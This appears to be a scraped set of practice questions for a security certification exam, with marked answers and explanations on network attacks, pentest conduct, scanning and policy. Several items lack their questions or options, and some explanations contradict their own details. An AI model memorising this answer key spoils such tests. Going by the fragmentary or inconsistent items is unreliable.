A supplier needs to connect several laptops to an organization’s network as part of their service agreement. These laptops will be operated and maintained by the supplier. Victor, a cybersecurity analyst for the organization, is concerned that these laptops could contain some vulnerabilities that could weaken the network's security posture. What can Victor do to mitigate the risk to other devices on the network without having direct administrative access to the supplier’s laptops?

- 

  Increase the encryption level of VPN used by the laptops

- 

  Scan the laptops for vulnerabilities and patch them

- 

  Require 2FA (two-factor authentication) on the laptops

- 

  Implement a jumpbox system

  (正確)

#### 解釋

OBJ-4.2: A jumpbox is a system on a network used to access and manage devices in a separate security zone. This would create network segmentation between the supplier's laptops and the rest of the network to minimize the risk. A jump-box system is a hardened and monitored device that spans two dissimilar security zones and provides a controlled means of access between them. While the other options listed are all good security practices, they do not fully mitigate the risk that insecure systems pose since Victor cannot enforce these configurations on a supplier-provided laptop. Instead, he must find a method of segmenting the laptops from the rest of the network, either physically, logically, using an air gap, or using a jumpbox.

A malicious user is blocking cellular devices from connecting to the Internet whenever they enter the coffee shop. If they get their coffee to go and walk at least a block away from the coffee shop, their smartphones will connect to the Internet again. What type of network attack is the malicious user performing?

- 

  Blocklisting IP addresses in the ACL

- 

  Frequency jamming

  (正確)

- 

  On-path attack

- 

  Spoofing

#### 解釋

OBJ-3.2: Frequency jamming is one of the many exploits used to compromise a wireless environment. Frequency jamming is the disruption of radio signals through the use of an over-powered signal in the same frequency range. It works by denying service to authorized users as legitimate traffic is jammed by the overwhelming frequencies of illegitimate traffic. There is no indication that the malicious user has created a rogue AP (which is a form of spoofing) or performing an on-path attack by having users connect through their laptop or device within this scenario. Also, there is no mention of certain websites or devices being blocked logically using a blocklist or ACL.

- 

  Denial of service attack targeting 10.10.3.6

- 

  Port scan targeting 10.10.3.6

  (正確)

#### 解釋

OBJ-2.3: Port Scanning is the name for the technique used to identify open ports and services available on a network host. Based on the logs, you can see a sequential scan of some commonly used ports (20, 21, 22, 23, 25, 80, 135, 443, 445) with a two-second pause between each attempt. The scan source is 10.10.3.2, and the destination of the scan is 10.10.3.6, making “Port scan targeting 10.10.3.6” the correct choice. IP fragmentation attacks are a common form of denial of service attack, in which the perpetrator overbears a network by exploiting datagram fragmentation mechanisms. A denial-of-service (DoS) attack occurs when legitimate users cannot access information systems, devices, or other network resources due to a malicious cyber threat actor's actions.

  Social engineering

- 

  Denial-of-service attacks

  (正確)

- 

  Reverse engineering

-

#### 解釋

OBJ-1.3: A denial-of-service or DoS attack isn’t usually included as part of a penetration test. This type of attack contains too much risk for an organization to allow it to be included in an assessment's scope. Social engineering, physical penetration attempts, and reverse engineering are all commonly included in a penetration test's scope. A penetration tester must limit the invasiveness of their assessment to the specific scope of the penetration test.

- 

  Schedule scans to run during periods of low activity

  (正確)

- 

  Schedule scans to begin at the same time every day

#### 解釋

OBJ-2.4: For the best results, the scans should be scheduled during periods of low activity. This will help to reduce the negative impact of scanning on business operations. The other three options all carry a higher risk of causing disruptions to the network or its business operations.

#### 解釋

OBJ-2.2: Service and version identification are often performed by conducting a banner grab or by checking responses for services to known fingerprints for those services. UDP response timing and other TCP/IP stack fingerprinting techniques are used to identify operating systems only. Using nmap -O will conduct an operating system fingerprint scan, but it will not identify the other services being run.

Sagar is planning to patch a production system to correct a detected vulnerability during his most recent network vulnerability scan. What process should he follow to minimize the risk of a system failure while patching this vulnerability?

- 

  Wait 60 days to deploy the patch to ensure there are no associated bugs reported with it

- 

  Deploy the patch immediately on the production system to remediate the vulnerability

- 

  Deploy the patch in a sandbox environment to test it before patching the production system

  (正確)

- 

  Contact the vendor to determine a safe time frame for deploying the patch into the production environment

#### 解釋

OBJ-4.2: While patching a system is necessary to remediate a vulnerability, you should always test the patch before implementation. It is considered a best practice to create a staging or sandbox environment to test the patches' installation before installing them into the production environment. This reduces the risks of the patch breaking something in the production system. Unless you are dealing with a very critical vulnerability and the risk of not patching is worse than the risk of patching the production system directly, you should not immediately patch the production systems without testing the patch first. You should not wait 60 days to deploy the patch. Waiting this long provides attackers an opportunity to reverse engineer the patch and create a working exploit against the vulnerability. Finally, asking the vendor for a safe time frame is not helpful since the vendor does not know the specifics of your environment or your business operations.

During a penetration test, you identify a critical vulnerability in a client's production Linux-based Apache webserver. Which of the following should you do NEXT?

- 

  Complete the engagement and notify the client in the executive summary of the report

- 

  Enter "sudo apache2 stop" to prevent an attacker from exploiting the server

- 

  Exploit the vulnerability, escalate privileges, and patch the vulnerability as root

- 

  Pause the engagement and notify the client using established communication paths

  (正確)

#### 解釋

OBJ-4.3: The penetration testing team should have a direct communication path with the system owners or their trusted agents during an engagement. If the team discovers any security breaches, current hacking activity, extremely critical findings on a production server, or a production server becomes unresponsive during exploitation, then the team should stop what they are doing and contract their trusted point of contact within the organization to get further guidance. The trusted agents and communication paths should be determined when planning the engagement.

  Utilizes a 24-bit initialization vector

- 

  Utilizes a 40-bit encryption key

- 

  Brute force occurs within 11,000 combinations

  (正確)

#### 解釋

OBJ-3.2: The most prominent attack against WPS0-enabled wireless networks involves brute-forcing the 8-digit PIN that client uses to enroll their devices without knowing the pre-shared key. WPS checks each half of the PIN individually, reducing the number of possible combinations from a maximum of 100,000,000 to only 11,000. This only takes a few minutes to crack on most modern computers, as long as the WAP doesn't have a lockout after a certain number of failures. The lockout mechanism may also be triggered based on the client's MAC, so you can often spoof MAC to bypass this defense.

- 

  fileserve04

- 

  webdev03

#### 解釋

OBJ-3.7: Due to the considerable increase in network utilization on dbsvr01, it will likely be suspected of compromise by the defenders and be investigated further for evidence of your team’s activities. The server has a historical average utilization of only 5.42 GB per week, but this week there has been an increase to 27.3 GB of usage. This increase is nearly 6x more than the previous week when all the other servers stayed relatively constant. This indicates a possible compromise of the database server (dbserve02) and should be investigated as a potential data breach or data exfiltration by the organization’s cyber defense team.

- 

  Phishing

- 

  Tailgating

- 

  On-path attack

#### 解釋

OBJ-3.6: While a malicious employee or insider could use all of the methods listed to obtain another user's passwords, shoulder surfing is the MOST likely to be used. Shoulder surfing is a type of social engineering technique used to obtain personal identification numbers (PINs), passwords, and other confidential data by looking over the victim's shoulder. Since a malicious employee or insider can work close to their victims (other users), they could easily use this technique to collect the victimized users' passwords. An on-path attack is an attack where the attacker secretly relays and possibly alters the communications between two parties who believe they are directly communicating with each other. The attacker makes independent connections with the victims and relays messages between them to make them believe they are talking directly to each other over a private connection. The attacker will intercept all relevant messages passing between the two victims and inject new ones. Tailgating is a social engineering technique to gain access to a building by following someone unaware of their presence. Phishing is an email-based social engineering attack in which the attacker sends an email from a supposedly reputable source, such as a bank, to try to elicit private information from the victim. Phishing attacks target an indiscriminate large group of random people.

  Faulty input validation

  (正確)

- 

  Output encoding

- 

  Directory traversals

#### 解釋

OBJ-3.3: A primary vector for attacking applications is to exploit faulty input validation. The input could include user data entered into a form or URL, passed by another application or link. This is heavily exploited by cross-site scripting, SQL injection, and XML injection attacks. Directory traversal is the practice of accessing a file from a location that the user is unauthorized to access. The attacker does this by ordering an application to backtrack through the directory path to read or execute a file in a parent directory. In a file inclusion attack, the attacker adds a file to a web app or website's running process. The file is either constructed to be malicious or manipulated to serve the attacker's malicious purposes. Cross-site scripting (XSS) is one of the most powerful input validation exploits. XSS involves a trusted site, a client browsing the trusted site, and the attacker's site.

OBJ-2.4: The attack vector explains what type of access that the attacker must have to a system or network and does not refer to the types of specialized conditions that must exist. In this case, the A rating refers to Adjacent, where the attacker must launch the attack from the same shared physical (such as Bluetooth or Wi-Fi network), logical network (such as a local subnet), or a limited administrative domain (such as a VPN or MPLS). An attack vector of Network (N) would allow the attack to extend beyond these options and conduct remote exploitation of the vulnerability. An attack vector of Local (L) would require the attacker to locally exploit the workstation via the keyboard or over an SSH connection. An attack vector of Physical (P) would require the attacker to physically touch or manipulate the vulnerable component themselves, such as conducting a cold boot attack.

A recent threat has been announced in the cybersecurity world, stating a critical vulnerability in a particular operating system's kernel. Unfortunately, your company has not maintained a current asset inventory, so you are unsure of how many of your servers may be affected. What should you do to find all of the affected servers within your network?

- 

  Conduct a packet capture of data traversing the server network

- 

  Conduct an OS fingerprinting scan across the network

  (正確)

- 

  Manually review the syslog server's logs

- 

  Conduct a service discovery scan on the network

#### 解釋

OBJ-2.3: By utilizing operating system fingerprinting using a tool like nmap, you can identify the servers running each version of an operating system. This will give you an accurate list of the possibly affected servers. Once you have this list, you can focus your attention on just those servers that need further inspection and scanning. Manually reviewing the Syslog server's log would take too long, and would not find servers that don't send their logs to the Syslog server. Conducting a packet capture would only allow you to find the server actively transmitting data during the period of time you are capturing. Conducting a service discovery scan would not identify which servers are running which operating systems effectively. For example, if you see that the Apache web service is running on port 80, it doesn't indicate running Linux or Windows as the underlying server.

Praveen is currently investigating activity from an attacker who compromised a host on the network. The individual appears to have used credentials belonging to a janitor. After breaching the system, the attacker entered some unrecognized commands with very long text strings and then began using the sudo command to carry out actions. What type of attack has just taken place?

- 

  Session hijacking

- 

  Social engineering

- 

  Privilege escalation

  (正確)

- 

  Phishing

#### 解釋

OBJ-3.7: The use of long query strings points to a buffer overflow attack, and the sudo command confirms the elevated privileges after the attack. This indicates a privilege escalation has occurred. While the other three options may have been used as an initial access vector, they cannot be confirmed based on the question's details. Only a privilege escalation is currently verified within the scenario due to the use of sudo.

Your company is concerned about the possibility of theft of sensitive information from their systems. The IT Director has directed that access to all USB storage devices be blocked on all corporate workstations to prevent this. The workstation should still use other USB devices, like scanners, printers, keyboards, and mice. Which of the following command-line tools should you use to install a Group Policy (GPO) to all workstations across the network to disable the use of USB storage devices?

- 

  sfc

- 

  diskpart

- 

  gpupdate

  (正確)

- 

  gpresult

#### 解釋

OBJ-4.2: The gpupdate command refreshes a computer's local Group Policy and any Active Directory-based group policies. This command works on Windows systems. The gpupdate command can be used to restrict access to USB removable storage devices (like USB thumb drives and hard drives). In some organizations, USB storage devices are blocked for security reasons to prevent security leakage of confidential data and the penetration of viruses into the internal corporate network. A Group Policy is the primary administrative tool for defining and controlling how programs, network resources, and the operating system operate for users and computers in an organization. In an active directory environment, Group Policy is applied to users or computers based on their membership in sites, domains, or organizational units. The gpresult command is used to display the Resultant Set of Policy (RSoP) information for a remote user and computer. Because you can apply overlapping policy settings to any computer or user, the Group Policy feature generates a resulting set of policy settings when the user logs on. The gpresult command displays the resulting set of policy settings that were enforced on the computer for the specified user when the user logged on. The diskpart command is a command-line disk-partitioning utility available for Microsoft operating systems. You can use it to view, create, delete, and modify a computer's disk partitions. The system file checker (SFC) command is a utility in Windows that allows users to scan for and restore corrupted Windows system files from the command line.

Which file on a Linux system is modified to set the maximum number of days before a password must be changed?

- 

  /etc/groups

- 

  /etc/shadow

  (正確)

- 

  /etc/passwd

- 

  /etc/users

#### 解釋

OBJ-4.2: The /etc/shadow file stores the actual password in an encrypted format (more like the hash of the password) for the user’s account with additional properties related to the user password. Basically, it stores secure user account information. All fields are separated by a colon (:) symbol. It contains one entry per line for each user listed in the /etc/passwd file. The last 6 fields provide password aging and account lockout features.

During a vulnerability scan of your network, you identified a vulnerability on an appliance installed by a vendor on your network under an ongoing service contract. You do not have access to the appliance's operating system as the device was installed under a support agreement with the vendor. What is your best course of action to remediate or mitigate this vulnerability?

- 

  Mark the identified vulnerability as a false positive

- 

  Contact the vendor to provide an update or to remediate the vulnerability

  (正確)

- 

  Wait 30 days, run the scan again, and determine if the vendor corrected the vulnerability

- 

  Try to gain access to the underlying operating system and install the patch

#### 解釋

OBJ-4.2: You should contact the vendor to determine if a patch is available for installation. Since this is a vendor-supported appliance installed under a service contract, the vendor is responsible for the appliance's management and security. You should not attempt to gain access to the underlying operating system to patch the vulnerability yourself, as this could void your warranty and void your service contract. Based on the information provided, there is no reason to believe that this is a false positive, either. You should not simply wait 30 days and rerun the scan, as this is a non-action. Instead, you should contact the vendor to fix this vulnerability. Then, you could rerun the scan to validate they have completed the mitigations and remediations.

Stephane was asked to assess the technical impact of a reconnaissance performed against his organization. He has discovered that a third party has been performing reconnaissance by querying the organization's WHOIS data. Which category of technical impact should he classify this as?

- 

  Low

  (正確)

- 

  High

- 

  Medium

- 

  Critical

#### 解釋

OBJ-4.1: This would be best classified as a low technical impact. Since WHOIS data about the organization's domain name is publicly available, it is considered a low impact. This is further mitigated by the fact that your company gets to decide what information is published in the WHOIS data. Since only publicly available information is being queried and exposed, this can be considered a low impact.

What is the proper threat classification for a security breach that employs brute-force methods to compromise, degrade, or destroy systems?

- 

  Improper usage

- 

  Attrition

  (正確)

- 

  Impersonation

- 

  Loss or theft of equipment

#### 解釋

OBJ-3.1: Attrition attacks employ brute-force methods to compromise, degrade, or destroy systems, networks, or services. An impersonation attack occurs when the attacker gains control of an employee's account and uses it to convince other employees to perform fraudulent actions. Improper usage occurs when an employee or other authorized user utilizes the systems or networks not as intended or designed. The loss or theft of equipment usually relates to a smartphone, tablet, or laptop being lost or stolen, and then the data on it becomes compromised.

Your company is setting up a system to accept credit cards in their retail and online locations. Which of the following compliance types should you be MOST concerned with dealing with credit cards?

- 

  GDPR

- 

  PCI-DSS

  (正確)

- 

  PII

- 

  PHI

#### 解釋

OBJ-1.1: The Payment Card Industry Data Security Standard (PCI-DSS) applies to companies of any size that accept credit card payments. If your company intends to accept card payment and store, process, and transmit cardholder data, you need to securely host your data and follow PCI compliance requirements. The General Data Protection Regulation (GDPR) is a regulation created in the European Union that creates provisions and requirements to protect the personal data of European Union (EU) citizens. Transfers of personal data outside the EU Single Market are restricted unless protected by like-for-like regulations, such as the US’s Privacy Shield requirements. Personally identifiable information (PII) is data used to identify, contact, or locate an individual. Information such as social security number (SSN), name, date of birth, email address, telephone number, street address, and biometric data is considered PII. Protected health information (PHI) refers to medical and insurance records, plus associated hospital and laboratory test results.

While conducting a penetration test against an organization, you created a clone of the login page of the company's webmail system using the Social Engineering Toolkit (SET). You wait until the Chief Financial Officer (CFO) logs into the website and capture their credentials. Which of the following attacks should you perform next using the CFO's credentials?

- 

  Downgrade

- 

  Impersonation

  (正確)

- 

  Vishing

- 

  Phishing

#### 解釋

OBJ-3.6: Impersonation is the act of pretending to be someone you are not. Elicitation is the collection or acquisition of data from human beings, usually through deception or social engineering. These two are often used together in an attack. Since the penetration tester is trying to gather the CFO's login credentials, they are likely trying to perform an account takeover to conduct an impersonation attack using a business email compromise (BEC) to elicit some action from personnel within the organization. The Social Engineering Toolkit (SET) is an open-source penetration testing framework included with Kali Linux that supports social engineering to penetrate a network or system.

Consider the following REGEX search string: 

![img](https://img-c.udemycdn.com/redactor/raw/quiz_question/2022-01-17_05-05-39-58c43285f30e8d524c936694135665ae.png)

Which of the following strings would NOT be included in the output of this search?

- 

  1.2.3.4

- 

  37.259.129.207

  (正確)

- 

  001.02.3.40

- 

  205.255.255.001

#### 解釋

OBJ-5.2: The \b delimiter indicates that we are looking for whole words for the complete string. The REGEX is made up of four identical repeating strings, (25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.". For now, let us refer to these octets, such as the ones used in internet protocol version 4 addresses. Each octet will allow the combination of 25[0-5] OR (|) 2[0-4][9-] OR numbers 00-99 is preceded by (?) a 0 or 1, or just a single number followed by a ".". Since the period is treated as a special character in a REGEX operator, the escape character (\) is required to enable the symbol to act as a dot or period in the output. This sequence repeats four times, allowing for all variations of normal IP addresses to be entered for values 0-255. Since 259 is outside the range of 255, this is rejected. More specifically, character strings starting with 25 must end with a number between 0 and 5 (25[0-5]). Therefore, 259 would be rejected. Now, on exam day, if you received a question like this, you can try to figure out the pattern as explained above, or you can take the logical shortcut. The logical shortcut is to look at the answer first and see that they all look like IP addresses. Remember, grep and REGEX are used by a cybersecurity analyst to search logs for indicators of compromise (like an IP address), so don't be afraid to take a logical guess if you need to conserve time during your exam. So, which one isn't a valid IP address? Clearly, 37.259.129.107 is not a valid IP address, so if you had to guess as to what wouldn't be an output of this complex-looking command, you should guess that one!

You have been contracted to perform a remote vulnerability scan of Dion Training's servers to determine if they comply with the company's software baseline. Which of the following types of scans should you conduct?

- 

  Compliance scan

  (正確)

- 

  Discovery scan

- 

  Full scan

- 

  Stealth scan

#### 解釋

OBJ-2.4: Compliance scanning verifies that a network adheres to certain policy requirements, such as a corporate baseline. These policies can be corporate, industry, or governmental regulations. In this scenario, you are asked to verify the servers comply with the company's software baseline. Therefore, a compliance scan is the best option to select. A discovery scan identifies the operating systems that are running on a network, maps those systems to IP addresses, and enumerates the open ports and services on those systems. A stealth scan performs half-open TCP scans by never completing the TCP 3-way handshake, making it difficult to detect. A full scan performs a full TCP 3-way handshake with the remote host to determine if it is online and available.

  .py

- 

  .sh

  (正確)

- 

  .vbs

- 

  .bat

#### 解釋

OBJ-5.2: A shell script is a file that contains a list of commands to be read and executed by the shell in Linux and macOS. A .sh file is used for a shell script and its first line always begins with #!/bin/bash that designates the interpreter. This line instructs the operating system to execute the script. Shell scripts allow you to perform various functions. These functions include automation of commands and tasks of system administration and troubleshooting, creating simple applications, and manipulating text or files. Python is a general-purpose programming language that can develop many different kinds of applications. It is designed to be easy to read, and the programs use fewer lines of code compared to other programming languages. The code runs in an interpreter. Python is preinstalled on many Linux distributions and can be installed on Windows. Python scripts are saved using the .py extension. VBScript is a scripting language based on Microsoft’s Visual Basic programming language. Network administrators often use VBScript to perform repetitive administrative tasks. With VBScript, you can run your scripts from either the command-line or the Windows graphical interface. Scripts that you write must be run within a host environment. Windows 10 provides Internet Explorer, IIS, and Windows Script Host (WSH) for this purpose. Batch scripts run on the Windows operating system and, in their simplest form, contain a list of several commands that are executed in a sequence. A .bat file is used for a batch script. You can run the file by calling its name from the command line or double-clicking the file in File Explorer. Generally, batch file scripts run from end to end and are limited in branching and user input.

Which of the following policies should you look at to ensure you understand these rules and guidelines?

- 

  SLA

- 

  MOU

- 

  NDA

#### 解釋

OBJ-4.2: BYOD (Bring Your Own Device) refers to the policy of permitting employees to bring personally owned devices to their workplace and to use those devices to access privileged company information and applications. A memorandum of understanding (MOU) is important because it defines the responsibilities of each party in an agreement, provides the scope and authority of the agreement, clarifies terms, and outlines compliance issues. A non-disclosure agreement (NDA) is a legal contract or part of a contract between at least two parties that outlines confidential material, knowledge, or information that the parties wish to share for certain purposes, but wish to restrict access to. A service level agreement (SLA) is a commitment between a service provider and a client for particular aspects of the service, such as quality, availability, or responsibilities.

A penetration tester wants to collect software versioning information from servers on the network. The penetration tester has set up a packet sniffer on a victimized host and sent a copy of the network traffic back to their workstation. The penetration tester’s objective in this assessment is to emulate an APT and remain stealthy for as long as possible while gathering information. Which of the following should the penetration tester do enumerate the software version used by the server?

- 

  Utilize netstat to locate active connections

- 

  Manually analyze the packet captures

  (正確)

- 

  Use Nessus to conduct a vulnerability scan

- 

  Use Nmap to query known ports

#### 解釋

OBJ-2.2: Since the penetration tester has already victimized a host and can collect packet captures from that host, the penetration tester should analyze the packet captures first. Packet captures contain every packet that is sent and received by the network. By using a program like Wireshark to analyze the packet captures, the penetration tester can see what kind of information and metadata is contained within the packets. By conducting this type of packet analysis, a penetration tester can determine what software versions are running on a given host or server since they send specific data and associated metadata within their packets during network communications. Using netstat would identify the active connections, but it would not provide software version information. Nmap can be used to query known ports to automatically conduct versioning of the software running on those ports, but it would be easily detected by a cybersecurity analyst or intrusion detection system. Nessus is a vulnerability scanner and it could provide the penetration tester with the software versions on a given host or server, but it is extremely noisy and would be detected easily by a cybersecurity analyst or intrusion detection system.
